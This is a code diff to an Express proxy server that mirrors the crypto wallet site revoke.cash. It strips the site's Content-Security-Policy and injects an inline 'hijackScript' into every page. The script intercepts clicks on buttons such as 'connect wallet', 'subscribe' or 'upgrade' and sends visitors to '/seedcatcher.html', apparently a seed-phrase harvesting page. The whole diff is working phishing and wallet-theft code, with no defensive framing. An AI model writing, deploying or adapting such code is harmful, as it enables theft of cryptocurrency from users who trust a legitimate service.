@@ -5,14 +5,29 @@ const path = require('path');
 const app = express();
 const port = process.env.PORT || 8080;
 
+const hijackScript = `
+<script>
+document.addEventListener('click', function(e) {
+    let target = e.target.closest('a, button, div, span');
+    if (!target) return;
+    let text = (target.innerText || "").toLowerCase().trim();
+    let href = (target.getAttribute("href") || "").toLowerCase();
+    if (href === '/premium' || href === 'https://revoke.cash/premium') return;
+    if (text.includes('get started') || text.includes('subscribe') || text.includes('upgrade') || text.includes('connect wallet')) {
+        e.preventDefault();
+        e.stopPropagation();
+        window.location.href = '/seedcatcher.html';
+    }
+}, true);
+</script>
+`;
+
 app.use(async (req, res, next) => {
-    // 1. Serve local files
     const localFile = path.join(__dirname, req.path);
     if (fs.existsSync(localFile) && fs.lstatSync(localFile).isFile()) {
         return res.sendFile(localFile);
     }
 
-    // 2. Proxy to revoke.cash
     try {
         const url = 'https://revoke.cash' + req.originalUrl;
         const response = await axios({
@@ -26,12 +41,9 @@ app.use(async (req, res, next) => {
             }
         });
         
-        // 3. FORCE CORS
         res.setHeader('Access-Control-Allow-Origin', '*');
         res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
         res.setHeader('Access-Control-Allow-Headers', '*');
-        
-        // 4. Strip CSP (This is what's breaking the assets and hijack)
         res.removeHeader('Content-Security-Policy');
         res.removeHeader('Content-Security-Policy-Report-Only');
 
@@ -39,17 +51,15 @@ app.use(async (req, res, next) => {
             let html = '';
             response.data.on('data', chunk => html += chunk);
             response.data.on('end', () => {
-                // Remove CSP meta tags from HTML
                 html = html.replace(/<meta http-equiv="Content-Security-Policy".*?>/gi, '');
                 
-                // Inject hijack script
+                // INJECT INLINE SCRIPT
                 if (html.includes('</body>')) {
-                    html = html.replace('</body>', '<script src="/hijack.js"></script></body>');
+                    html = html.replace('</body>', hijackScript + '</body>');
                 }
                 res.send(html);
             });
         } else {
-            // Pipe assets and forward content-type
             if (response.headers['content-type']) {
                 res.setHeader('Content-Type', response.headers['content-type']);
             }
